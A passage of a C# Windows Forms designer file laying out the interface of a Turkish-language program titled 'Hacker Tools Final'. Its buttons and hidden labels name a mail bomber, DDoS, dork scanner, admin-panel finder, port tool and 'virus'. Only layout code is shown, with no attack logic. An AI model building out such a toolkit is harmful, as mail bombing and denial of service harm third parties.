            this.effectualButtonBlue17.TabIndex = 8;
            this.effectualButtonBlue17.Text = "MAİL BOMBER";
            this.effectualButtonBlue17.Click += new System.EventHandler(this.EffectualButtonBlue17_Click);
            // 
            // label69
            // 
            this.label69.AutoSize = true;
            this.label69.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label69.Location = new System.Drawing.Point(268, 38);
            this.label69.Name = "label69";
            this.label69.Size = new System.Drawing.Size(98, 17);
            this.label69.TabIndex = 33;
            this.label69.Text = "/AKTİF/KAPAT";
            this.label69.Visible = false;
            // 
            // effectualButtonBlue16
            // 
            this.effectualButtonBlue16.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue16.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue16.Location = new System.Drawing.Point(11, 153);
            this.effectualButtonBlue16.Name = "effectualButtonBlue16";
            this.effectualButtonBlue16.Size = new System.Drawing.Size(369, 33);
            this.effectualButtonBlue16.TabIndex = 7;
            this.effectualButtonBlue16.Text = "IP & PORT";
            this.effectualButtonBlue16.Click += new System.EventHandler(this.EffectualButtonBlue16_Click);
            // 
            // effectualButtonBlue15
            // 
            this.effectualButtonBlue15.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue15.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue15.Location = new System.Drawing.Point(11, 112);
            this.effectualButtonBlue15.Name = "effectualButtonBlue15";
            this.effectualButtonBlue15.Size = new System.Drawing.Size(369, 33);
            this.effectualButtonBlue15.TabIndex = 6;
            this.effectualButtonBlue15.Text = "DDOS";
            this.effectualButtonBlue15.Click += new System.EventHandler(this.EffectualButtonBlue15_Click);
            // 
            // effectualButtonBlue14
            // 
            this.effectualButtonBlue14.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue14.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue14.Location = new System.Drawing.Point(11, 70);
            this.effectualButtonBlue14.Name = "effectualButtonBlue14";
            this.effectualButtonBlue14.Size = new System.Drawing.Size(369, 33);
            this.effectualButtonBlue14.TabIndex = 5;
            this.effectualButtonBlue14.Text = "DORK TARAYICI";
            this.effectualButtonBlue14.Click += new System.EventHandler(this.EffectualButtonBlue14_Click);
            // 
            // effectualButtonBlue13
            // 
            this.effectualButtonBlue13.BackColor = System.Drawing.Color.Transparent;
            this.effectualButtonBlue13.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.effectualButtonBlue13.Location = new System.Drawing.Point(11, 28);
            this.effectualButtonBlue13.Name = "effectualButtonBlue13";
            this.effectualButtonBlue13.Size = new System.Drawing.Size(369, 33);
            this.effectualButtonBlue13.TabIndex = 4;
            this.effectualButtonBlue13.Text = "ADMİN BULUCU";
            this.effectualButtonBlue13.Click += new System.EventHandler(this.EffectualButtonBlue13_Click);
            // 
            // panel60
            // 
            this.panel60.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel60.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel60.Location = new System.Drawing.Point(10, 59);
            this.panel60.Name = "panel60";
            this.panel60.Size = new System.Drawing.Size(86, 10);
            this.panel60.TabIndex = 8;
            // 
            // panel59
            // 
            this.panel59.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel59.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel59.Location = new System.Drawing.Point(96, 36);
            this.panel59.Name = "panel59";
            this.panel59.Size = new System.Drawing.Size(10, 33);
            this.panel59.TabIndex = 7;
            // 
            // panel58
            // 
            this.panel58.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel58.Dock = System.Windows.Forms.DockStyle.Left;
            this.panel58.Location = new System.Drawing.Point(0, 36);
            this.panel58.Name = "panel58";
            this.panel58.Size = new System.Drawing.Size(10, 33);
            this.panel58.TabIndex = 6;
            // 
            // panel57
            // 
            this.panel57.BackColor = System.Drawing.Color.DarkSlateGray;
            this.panel57.Controls.Add(this.ambiance_Button_26);
            this.panel57.Controls.Add(this.label68);
            this.panel57.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel57.Location = new System.Drawing.Point(0, 0);
            this.panel57.Name = "panel57";
            this.panel57.Size = new System.Drawing.Size(106, 36);
            this.panel57.TabIndex = 5;
            this.panel57.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel57_MouseDown);
            this.panel57.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel57_MouseMove);
            this.panel57.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel57_MouseUp);
            // 
            // ambiance_Button_26
            // 
            this.ambiance_Button_26.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.ambiance_Button_26.BackColor = System.Drawing.Color.Transparent;
            this.ambiance_Button_26.Font = new System.Drawing.Font("Segoe UI", 11F, System.Drawing.FontStyle.Bold);
            this.ambiance_Button_26.Image = null;
            this.ambiance_Button_26.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.ambiance_Button_26.Location = new System.Drawing.Point(71, 6);
            this.ambiance_Button_26.Name = "ambiance_Button_26";
            this.ambiance_Button_26.Size = new System.Drawing.Size(26, 24);
            this.ambiance_Button_26.TabIndex = 28;
            this.ambiance_Button_26.Text = "X";
            this.ambiance_Button_26.TextAlignment = System.Drawing.StringAlignment.Center;
            this.ambiance_Button_26.Click += new System.EventHandler(this.Ambiance_Button_26_Click);
            // 
            // label68
            // 
            this.label68.AutoSize = true;
            this.label68.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label68.ForeColor = System.Drawing.SystemColors.Window;
            this.label68.Location = new System.Drawing.Point(142, 9);
            this.label68.Name = "label68";
            this.label68.Size = new System.Drawing.Size(151, 17);
            this.label68.TabIndex = 12;
            this.label68.Text = "< GÖREV YÖNETİCİSİ >";
            // 
            // panel62
            // 
            this.panel62.BackColor = System.Drawing.Color.Silver;
            this.panel62.Controls.Add(this.button22);
            this.panel62.Controls.Add(this.button21);
            this.panel62.Controls.Add(this.label83);
            this.panel62.Controls.Add(this.button19);
            this.panel62.Controls.Add(this.button20);
            this.panel62.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel62.Location = new System.Drawing.Point(0, 0);
            this.panel62.Margin = new System.Windows.Forms.Padding(2);
            this.panel62.Name = "panel62";
            this.panel62.Size = new System.Drawing.Size(1431, 28);
            this.panel62.TabIndex = 34;
            this.panel62.MouseDown += new System.Windows.Forms.MouseEventHandler(this.Panel62_MouseDown);
            this.panel62.MouseMove += new System.Windows.Forms.MouseEventHandler(this.Panel62_MouseMove);
            this.panel62.MouseUp += new System.Windows.Forms.MouseEventHandler(this.Panel62_MouseUp);
            // 
            // button22
            // 
            this.button22.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.button22.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button22.FlatAppearance.BorderColor = System.Drawing.Color.Black;
            this.button22.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button22.ForeColor = System.Drawing.Color.White;
            this.button22.Location = new System.Drawing.Point(1377, 3);
            this.button22.Margin = new System.Windows.Forms.Padding(2);
            this.button22.Name = "button22";
            this.button22.Size = new System.Drawing.Size(26, 22);
            this.button22.TabIndex = 33;
            this.button22.Text = "\\";
            this.button22.UseVisualStyleBackColor = true;
            this.button22.Visible = false;
            this.button22.Click += new System.EventHandler(this.Button22_Click);
            // 
            // button21
            // 
            this.button21.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.button21.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button21.FlatAppearance.BorderColor = System.Drawing.Color.Black;
            this.button21.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button21.ForeColor = System.Drawing.Color.White;
            this.button21.Location = new System.Drawing.Point(1377, 3);
            this.button21.Margin = new System.Windows.Forms.Padding(2);
            this.button21.Name = "button21";
            this.button21.Size = new System.Drawing.Size(26, 22);
            this.button21.TabIndex = 32;
            this.button21.Text = "/";
            this.button21.UseVisualStyleBackColor = false;
            this.button21.Click += new System.EventHandler(this.Button21_Click);
            // 
            // label83
            // 
            this.label83.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.label83.AutoSize = true;
            this.label83.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label83.Location = new System.Drawing.Point(659, 7);
            this.label83.Name = "label83";
            this.label83.Size = new System.Drawing.Size(136, 13);
            this.label83.TabIndex = 26;
            this.label83.Text = "< Hacker Tools Final >";
            // 
            // button19
            // 
            this.button19.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.button19.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button19.FlatAppearance.BorderColor = System.Drawing.Color.Black;
            this.button19.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button19.ForeColor = System.Drawing.Color.White;
            this.button19.Location = new System.Drawing.Point(1354, 3);
            this.button19.Margin = new System.Windows.Forms.Padding(2);
            this.button19.Name = "button19";
            this.button19.Size = new System.Drawing.Size(26, 22);
            this.button19.TabIndex = 3;
            this.button19.Text = "X";
            this.button19.UseVisualStyleBackColor = false;
            this.button19.Click += new System.EventHandler(this.Button19_Click);
            // 
            // button20
            // 
            this.button20.Anchor = System.Windows.Forms.AnchorStyles.Right;
            this.button20.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.button20.FlatAppearance.BorderColor = System.Drawing.Color.Black;
            this.button20.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button20.ForeColor = System.Drawing.Color.White;
            this.button20.Location = new System.Drawing.Point(1399, 3);
            this.button20.Margin = new System.Windows.Forms.Padding(2);
            this.button20.Name = "button20";
            this.button20.Size = new System.Drawing.Size(26, 22);
            this.button20.TabIndex = 4;
            this.button20.Text = "-";
            this.button20.UseVisualStyleBackColor = false;
            this.button20.Click += new System.EventHandler(this.Button20_Click);
            // 
            // panel10
            // 
            this.panel10.Controls.Add(this.effectualGroupBox1);
            this.panel10.Dock = System.Windows.Forms.DockStyle.Right;
            this.panel10.Location = new System.Drawing.Point(1231, 28);
            this.panel10.Name = "panel10";
            this.panel10.Size = new System.Drawing.Size(200, 744);
            this.panel10.TabIndex = 35;
            // 
            // effectualGroupBox1
            // 
            this.effectualGroupBox1.BackColor = System.Drawing.Color.Transparent;
            this.effectualGroupBox1.Controls.Add(this.label82);
            this.effectualGroupBox1.Controls.Add(this.label81);
            this.effectualGroupBox1.Controls.Add(this.label80);
            this.effectualGroupBox1.Controls.Add(this.recuperareIIButton3);
            this.effectualGroupBox1.Controls.Add(this.label9);
            this.effectualGroupBox1.Controls.Add(this.label13);
            this.effectualGroupBox1.Controls.Add(this.label12);
            this.effectualGroupBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.effectualGroupBox1.Location = new System.Drawing.Point(0, 521);
            this.effectualGroupBox1.Name = "effectualGroupBox1";
            this.effectualGroupBox1.Size = new System.Drawing.Size(200, 223);
            this.effectualGroupBox1.TabIndex = 20;
            this.effectualGroupBox1.Text = "Tarih & Saat";
            // 
            // label82
            // 
            this.label82.AutoSize = true;
            this.label82.Font = new System.Drawing.Font("Microsoft YaHei", 8.25F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label82.Location = new System.Drawing.Point(70, 139);
            this.label82.Name = "label82";
            this.label82.Size = new System.Drawing.Size(38, 16);
            this.label82.TabIndex = 25;
            this.label82.Text = "Saat :";
            // 
            // label81
            // 
            this.label81.AutoSize = true;
            this.label81.Font = new System.Drawing.Font("Microsoft YaHei", 9.75F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label81.Location = new System.Drawing.Point(49, 98);
            this.label81.Name = "label81";
            this.label81.Size = new System.Drawing.Size(46, 19);
            this.label81.TabIndex = 24;
            this.label81.Text = "Saat :";
            // 
            // label80
            // 
            this.label80.AutoSize = true;
            this.label80.Font = new System.Drawing.Font("Microsoft YaHei", 9.75F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label80.Location = new System.Drawing.Point(53, 61);
            this.label80.Name = "label80";
            this.label80.Size = new System.Drawing.Size(46, 19);
            this.label80.TabIndex = 23;
            this.label80.Text = "Saat :";
            // 
            // recuperareIIButton3
            // 
            this.recuperareIIButton3.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton3.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton3.Location = new System.Drawing.Point(7, 190);
            this.recuperareIIButton3.Name = "recuperareIIButton3";
            this.recuperareIIButton3.Size = new System.Drawing.Size(181, 30);
            this.recuperareIIButton3.TabIndex = 22;
            this.recuperareIIButton3.Text = "Kapat";
            this.recuperareIIButton3.Click += new System.EventHandler(this.RecuperareIIButton3_Click);
            // 
            // label9
            // 
            this.label9.AutoSize = true;
            this.label9.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label9.Location = new System.Drawing.Point(6, 63);
            this.label9.Name = "label9";
            this.label9.Size = new System.Drawing.Size(41, 17);
            this.label9.TabIndex = 19;
            this.label9.Text = "Saat :";
            // 
            // label13
            // 
            this.label13.AutoSize = true;
            this.label13.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label13.Location = new System.Drawing.Point(6, 137);
            this.label13.Name = "label13";
            this.label13.Size = new System.Drawing.Size(64, 17);
            this.label13.TabIndex = 21;
            this.label13.Text = "Kullanıcı:";
            // 
            // label12
            // 
            this.label12.AutoSize = true;
            this.label12.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label12.Location = new System.Drawing.Point(6, 100);
            this.label12.Name = "label12";
            this.label12.Size = new System.Drawing.Size(43, 17);
            this.label12.TabIndex = 20;
            this.label12.Text = "Tarih:";
            // 
            // label84
            // 
            this.label84.AutoSize = true;
            this.label84.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label84.Location = new System.Drawing.Point(316, 208);
            this.label84.Name = "label84";
            this.label84.Size = new System.Drawing.Size(93, 17);
            this.label84.TabIndex = 36;
            this.label84.Text = "tüm özellikler";
            this.label84.Visible = false;
            // 
            // label85
            // 
            this.label85.AutoSize = true;
            this.label85.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label85.Location = new System.Drawing.Point(422, 209);
            this.label85.Name = "label85";
            this.label85.Size = new System.Drawing.Size(42, 17);
            this.label85.TabIndex = 37;
            this.label85.Text = "index";
            this.label85.Visible = false;
            // 
            // label86
            // 
            this.label86.AutoSize = true;
            this.label86.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label86.Location = new System.Drawing.Point(532, 212);
            this.label86.Name = "label86";
            this.label86.Size = new System.Drawing.Size(36, 17);
            this.label86.TabIndex = 38;
            this.label86.Text = "dork";
            this.label86.Visible = false;
            // 
            // label87
            // 
            this.label87.AutoSize = true;
            this.label87.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label87.Location = new System.Drawing.Point(631, 212);
            this.label87.Name = "label87";
            this.label87.Size = new System.Drawing.Size(34, 17);
            this.label87.TabIndex = 39;
            this.label87.Text = "port";
            this.label87.Visible = false;
            // 
            // label88
            // 
            this.label88.AutoSize = true;
            this.label88.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label88.Location = new System.Drawing.Point(729, 305);
            this.label88.Name = "label88";
            this.label88.Size = new System.Drawing.Size(43, 17);
            this.label88.TabIndex = 40;
            this.label88.Text = "görev";
            this.label88.Visible = false;
            // 
            // label89
            // 
            this.label89.AutoSize = true;
            this.label89.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label89.Location = new System.Drawing.Point(619, 307);
            this.label89.Name = "label89";
            this.label89.Size = new System.Drawing.Size(38, 17);
            this.label89.TabIndex = 41;
            this.label89.Text = "ddos";
            this.label89.Visible = false;
            // 
            // label90
            // 
            this.label90.AutoSize = true;
            this.label90.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label90.Location = new System.Drawing.Point(718, 208);
            this.label90.Name = "label90";
            this.label90.Size = new System.Drawing.Size(38, 17);
            this.label90.TabIndex = 42;
            this.label90.Text = "virüs";
            this.label90.Visible = false;
            // 
            // label91
            // 
            this.label91.AutoSize = true;
            this.label91.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label91.Location = new System.Drawing.Point(806, 210);
            this.label91.Name = "label91";
            this.label91.Size = new System.Drawing.Size(57, 17);
            this.label91.TabIndex = 43;
            this.label91.Text = "browser";
            this.label91.Visible = false;
            // 
            // label92
            // 
            this.label92.AutoSize = true;
            this.label92.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label92.Location = new System.Drawing.Point(525, 308);
            this.label92.Name = "label92";
            this.label92.Size = new System.Drawing.Size(34, 17);
            this.label92.TabIndex = 44;
            this.label92.Text = "ayar";
            this.label92.Visible = false;
            // 
            // label93
            // 
            this.label93.AutoSize = true;
            this.label93.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label93.Location = new System.Drawing.Point(428, 305);
            this.label93.Name = "label93";
            this.label93.Size = new System.Drawing.Size(47, 17);
            this.label93.TabIndex = 45;
            this.label93.Text = "admin";
            this.label93.Visible = false;
            // 
            // label94
            // 
            this.label94.AutoSize = true;
            this.label94.Font = new System.Drawing.Font("Microsoft YaHei", 9F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label94.Location = new System.Drawing.Point(335, 311);
            this.label94.Name = "label94";
            this.label94.Size = new System.Drawing.Size(35, 17);
            this.label94.TabIndex = 46;
            this.label94.Text = "mail";
            this.label94.Visible = false;
            // 
            // iTalk_Panel1
            // 
            this.iTalk_Panel1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.iTalk_Panel1.BackColor = System.Drawing.Color.Transparent;
            this.iTalk_Panel1.Controls.Add(this.monoFlat_Button27);
            this.iTalk_Panel1.Controls.Add(this.panel61);
            this.iTalk_Panel1.Controls.Add(this.label79);
            this.iTalk_Panel1.Controls.Add(this.pictureBox28);
            this.iTalk_Panel1.Controls.Add(this.recuperareIIButton7);
            this.iTalk_Panel1.Controls.Add(this.recuperareIIButton8);
            this.iTalk_Panel1.Controls.Add(this.recuperareIIButton11);
            this.iTalk_Panel1.Controls.Add(this.recuperareIIButton9);
            this.iTalk_Panel1.Controls.Add(this.recuperareIIButton10);
            this.iTalk_Panel1.Location = new System.Drawing.Point(-2, 427);
            this.iTalk_Panel1.Name = "iTalk_Panel1";
            this.iTalk_Panel1.Padding = new System.Windows.Forms.Padding(5);
            this.iTalk_Panel1.Size = new System.Drawing.Size(257, 346);
            this.iTalk_Panel1.TabIndex = 33;
            this.iTalk_Panel1.Text = "iTalk_Panel1";
            // 
            // monoFlat_Button27
            // 
            this.monoFlat_Button27.BackColor = System.Drawing.Color.Transparent;
            this.monoFlat_Button27.Font = new System.Drawing.Font("Segoe UI", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.monoFlat_Button27.Image = null;
            this.monoFlat_Button27.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.monoFlat_Button27.Location = new System.Drawing.Point(79, 298);
            this.monoFlat_Button27.Name = "monoFlat_Button27";
            this.monoFlat_Button27.Size = new System.Drawing.Size(90, 21);
            this.monoFlat_Button27.TabIndex = 34;
            this.monoFlat_Button27.Text = "KAPAT";
            this.monoFlat_Button27.TextAlignment = System.Drawing.StringAlignment.Center;
            this.monoFlat_Button27.Click += new System.EventHandler(this.MonoFlat_Button27_Click);
            // 
            // panel61
            // 
            this.panel61.BackColor = System.Drawing.SystemColors.ActiveCaption;
            this.panel61.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel61.Location = new System.Drawing.Point(5, 329);
            this.panel61.Name = "panel61";
            this.panel61.Size = new System.Drawing.Size(247, 12);
            this.panel61.TabIndex = 35;
            // 
            // label79
            // 
            this.label79.AutoSize = true;
            this.label79.Font = new System.Drawing.Font("Tahoma", 12F, ((System.Drawing.FontStyle)((System.Drawing.FontStyle.Bold | System.Drawing.FontStyle.Italic))), System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.label79.Location = new System.Drawing.Point(101, 40);
            this.label79.Name = "label79";
            this.label79.Size = new System.Drawing.Size(105, 19);
            this.label79.TabIndex = 34;
            this.label79.Text = "HOŞGELDİN";
            // 
            // pictureBox28
            // 
            this.pictureBox28.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox28.Image")));
            this.pictureBox28.Location = new System.Drawing.Point(14, 19);
            this.pictureBox28.Name = "pictureBox28";
            this.pictureBox28.Size = new System.Drawing.Size(65, 62);
            this.pictureBox28.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox28.TabIndex = 28;
            this.pictureBox28.TabStop = false;
            // 
            // recuperareIIButton7
            // 
            this.recuperareIIButton7.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton7.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton7.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton7.Location = new System.Drawing.Point(8, 93);
            this.recuperareIIButton7.Name = "recuperareIIButton7";
            this.recuperareIIButton7.Size = new System.Drawing.Size(238, 34);
            this.recuperareIIButton7.TabIndex = 22;
            this.recuperareIIButton7.Text = "TÜM ÖZELLİKLER";
            this.recuperareIIButton7.Click += new System.EventHandler(this.RecuperareIIButton7_Click);
            // 
            // recuperareIIButton8
            // 
            this.recuperareIIButton8.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton8.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton8.Location = new System.Drawing.Point(8, 133);
            this.recuperareIIButton8.Name = "recuperareIIButton8";
            this.recuperareIIButton8.Size = new System.Drawing.Size(238, 34);
            this.recuperareIIButton8.TabIndex = 23;
            this.recuperareIIButton8.Text = "GÖREV YÖNETİCİSİ";
            this.recuperareIIButton8.Click += new System.EventHandler(this.RecuperareIIButton8_Click);
            // 
            // recuperareIIButton11
            // 
            this.recuperareIIButton11.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton11.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton11.Location = new System.Drawing.Point(7, 256);
            this.recuperareIIButton11.Name = "recuperareIIButton11";
            this.recuperareIIButton11.Size = new System.Drawing.Size(238, 34);
            this.recuperareIIButton11.TabIndex = 26;
            this.recuperareIIButton11.Text = "HAKKINDA";
            this.recuperareIIButton11.Click += new System.EventHandler(this.RecuperareIIButton11_Click);
            // 
            // recuperareIIButton9
            // 
            this.recuperareIIButton9.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton9.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton9.Location = new System.Drawing.Point(8, 173);
            this.recuperareIIButton9.Name = "recuperareIIButton9";
            this.recuperareIIButton9.Size = new System.Drawing.Size(238, 34);
            this.recuperareIIButton9.TabIndex = 24;
            this.recuperareIIButton9.Text = "KİŞİLEŞTİR";
            this.recuperareIIButton9.Click += new System.EventHandler(this.RecuperareIIButton9_Click);
            // 
            // recuperareIIButton10
            // 
            this.recuperareIIButton10.BackColor = System.Drawing.Color.Transparent;
            this.recuperareIIButton10.Font = new System.Drawing.Font("Verdana", 6.75F, System.Drawing.FontStyle.Bold);
            this.recuperareIIButton10.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(27)))), ((int)(((byte)(94)))), ((int)(((byte)(137)))));
            this.recuperareIIButton10.Location = new System.Drawing.Point(7, 215);
            this.recuperareIIButton10.Name = "recuperareIIButton10";
            this.recuperareIIButton10.Size = new System.Drawing.Size(238, 34);
            this.recuperareIIButton10.TabIndex = 25;
            this.recuperareIIButton10.Text = "AYARLAR";
            this.recuperareIIButton10.Click += new System.EventHandler(this.RecuperareIIButton10_Click);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.LightBlue;
            this.ClientSize = new System.Drawing.Size(1431, 813);
            this.Controls.Add(this.label94);
            this.Controls.Add(this.label93);
            this.Controls.Add(this.label92);
            this.Controls.Add(this.label91);
            this.Controls.Add(this.panel10);
            this.Controls.Add(this.panel62);
            this.Controls.Add(this.label90);
            this.Controls.Add(this.iTalk_Panel1);
            this.Controls.Add(this.label67);
            this.Controls.Add(this.label89);
            this.Controls.Add(this.pictureBox27);
            this.Controls.Add(this.panel26);
            this.Controls.Add(this.label88);
            this.Controls.Add(this.pictureBox2);
            this.Controls.Add(this.panel9);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.label87);
            this.Controls.Add(this.panel41);
            this.Controls.Add(this.panel16);
            this.Controls.Add(this.panel31);
            this.Controls.Add(this.label86);
            this.Controls.Add(this.label8);
            this.Controls.Add(this.panel21);
            this.Controls.Add(this.panel2);
            this.Controls.Add(this.label85);
            this.Controls.Add(this.pictureBox9);
            this.Controls.Add(this.panel36);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.label84);
            this.Controls.Add(this.pictureBox3);
            this.Controls.Add(this.panel46);
            this.Controls.Add(this.pictureBox7);
            this.Controls.Add(this.panel51);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.panel56);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.pictureBox6);
            this.Controls.Add(this.pictureBox4);
            this.Controls.Add(this.label3);
